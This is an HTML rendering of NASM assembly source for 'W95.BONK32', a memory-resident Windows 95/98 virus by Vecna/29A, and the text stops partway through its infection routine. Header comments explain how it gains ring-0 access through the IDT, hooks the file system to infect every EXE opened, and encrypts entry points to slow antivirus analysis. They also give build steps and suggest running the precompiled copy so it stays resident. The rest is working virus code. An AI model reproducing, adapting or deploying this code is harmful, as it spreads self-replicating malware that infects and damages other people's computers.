<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Bonk.1243 - bonk32.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;[W95.BONK32] Resident PE infector</span><span class="sc0">
</span><span class="sc1">;Copyright 1998 (c) Vecna</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus is the 2nd PE infector i wrote, and is a memory resident infector</span><span class="sc0">
</span><span class="sc1">;designed exclusively for win95/98. It shouldnt work neither in winNT or in</span><span class="sc0">
</span><span class="sc1">;w32s. It patches the IDT, that isnt protected in w95/98, modifies a vector</span><span class="sc0">
</span><span class="sc1">;to point code into the virus, and execute this interrupt. As the code is</span><span class="sc0">
</span><span class="sc1">;executed in ring0, the virus alloc memory and read from the host file the</span><span class="sc0">
</span><span class="sc1">;rest of the virus code. It then jump to this virus part, that hook IFS and</span><span class="sc0">
</span><span class="sc1">;restore the host.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Always a EXE file is open, the virus handler take control, and infect it.</span><span class="sc0">
</span><span class="sc1">;The virus body is appended as a overlay to the end of host, without any</span><span class="sc0">
</span><span class="sc1">;physical link to host, and a small loader is stored into the free space of</span><span class="sc0">
</span><span class="sc1">;the PE header.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;If the host file dont have relocationz, the virus encript the original</span><span class="sc0">
</span><span class="sc1">;entrypoint and patch it with a jump to the virus loader. The key for the code</span><span class="sc0">
</span><span class="sc1">;encripted is not saved, but a CRC32 of it unencripted is stored. When the</span><span class="sc0">
</span><span class="sc1">;virus restore it, it must try all keyz, what can be time costly for AVerz.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;As the original entrypoint dont change, and the virus code isnt linked to</span><span class="sc0">
</span><span class="sc1">;host, beside the loader, this work as a anti-heuristic feature.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Early versionz haved a bug, that cause a crash in everybody machine beside</span><span class="sc0">
</span><span class="sc1">;mine. This was because a non-fixed call to int 0x20. Some lines added and</span><span class="sc0">
</span><span class="sc1">;now it work fine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;W95.Bonk32 is written using NASM sintax, that showed very efficient for my</span><span class="sc0">
</span><span class="sc1">;viral needz, as provide more control over the generated code . To compile</span><span class="sc0">
</span><span class="sc1">;you will need NASM, LINK from Microsoft and PEWRSEC from Jacky Qwerty/29A.</span><span class="sc0">
</span><span class="sc1">;You also will need any MAKE utility (Borland, Microsoft and LCC ones work).</span><span class="sc0">
</span><span class="sc1">;then debug it using SOFT-ICE till u get the point that the virus open host</span><span class="sc0">
</span><span class="sc1">;at this point, change esi to point to a unused area (ECX hold one), then</span><span class="sc0">
</span><span class="sc1">;then edit this memory (D ESI;EB) and type the dir you are and \bonk32 at the</span><span class="sc0">
</span><span class="sc1">;end. Then make the virus go(BC *;G).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Or, better, run the pre-compiled file. It will execute and stay resident.</span><span class="sc0">
</span><span class="sc1">;All open files will be infected then. Remeber that the pre-compiled file</span><span class="sc0">
</span><span class="sc1">;must reside in root dir of C:, else it will crash.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I must thank 2 people: the AV that discovered the bug, and Alchemy, that</span><span class="sc0">
</span><span class="sc1">;gimme the EIP of the fault and make possible to me fix it.</span><span class="sc0">

</span><span class="sc4">[</span><span class="sc9">bits</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc4">[</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc4">[</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">_main</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0">   </span><span class="sc5">false</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">userda</span><span class="sc0">  </span><span class="sc5">true</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">  </span><span class="sc5">bname</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">buffer2</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">

</span><span class="sc9">%macro</span><span class="sc0"> </span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">%2</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">%1</span><span class="sc0">
</span><span class="sc9">%endmacro</span><span class="sc0">

</span><span class="sc5">hook</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">                        </span><span class="sc1">;setup stack frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.delta</span><span class="sc0">
  </span><span class="sc5">.delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">.delta</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0x0C</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x24</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.noopen</span><span class="sc0">                             </span><span class="sc1">;only hookz ifs_opne</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">recurse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.noopen</span><span class="sc0">                             </span><span class="sc1">;no re-enter</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">recurse</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dynacall</span><span class="sc0">                           </span><span class="sc1">;fix dynamic int20 calls</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uni2ansi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">                             </span><span class="sc1">;replicate</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">recurse</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">.noopen</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x06</span><span class="sc0">                           </span><span class="sc1">;total=6 paramz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc0">
  </span><span class="sc5">.nparam</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;copy paramz from old frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;to new frame</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.nparam</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0xb8</span><span class="sc0">
  </span><span class="sc5">oldhook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;call old hookz</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">leave</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[BONK32] by Vecna/29A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">

</span><span class="sc5">dynacall</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20CD</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.odynatable</span><span class="sc0">
  </span><span class="sc5">.dynatable</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0x0D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">                           </span><span class="sc1">;function, vxd</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
  </span><span class="sc5">.odynatable</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fix1</span><span class="sc4">-</span><span class="sc5">.dynatable</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;make vxd calls to dynamic</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">                                   </span><span class="sc1">;int20 code</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc4">-</span><span class="sc5">fix1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">fix3</span><span class="sc4">-</span><span class="sc5">IFS</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fix4</span><span class="sc4">-</span><span class="sc5">fix3</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">;make all fixes</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">uni2ansi</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">bname</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.drive</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'@'</span><span class="sc0">                             </span><span class="sc1">;make number2letter</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
  </span><span class="sc5">.drive</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0x1C</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x0C</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">fix4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc0">                      </span><span class="sc1">;make unicode2ansi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">bname</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                             </span><span class="sc1">;end of name</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0x05</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.EXE'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                          </span><span class="sc1">;only infect exe files</span><span class="sc0">
    </span><span class="sc9">%if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0x09</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'BAIT'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                          </span><span class="sc1">;debug code</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD500</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;open it</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.delta</span><span class="sc0">
  </span><span class="sc5">.delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">.delta</span><span class="sc0">                         </span><span class="sc1">;ebp hold delta offset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD600</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;read pe headerz</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA7</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">                     </span><span class="sc1">;not exe</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x3C</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE00</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">                      </span><span class="sc1">;buffer overflow</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'PE'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">                     </span><span class="sc1">;not pe newexe</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'BONK'</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">88</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">88</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">                      </span><span class="sc1">;already infected</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x014C</span><span class="sc0">                </span><span class="sc1">;run in a 386?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">;executable?</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0D</span><span class="sc0">                  </span><span class="sc1">;dll?</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;mementry==imagebase+entrypont</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loader.entrypoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
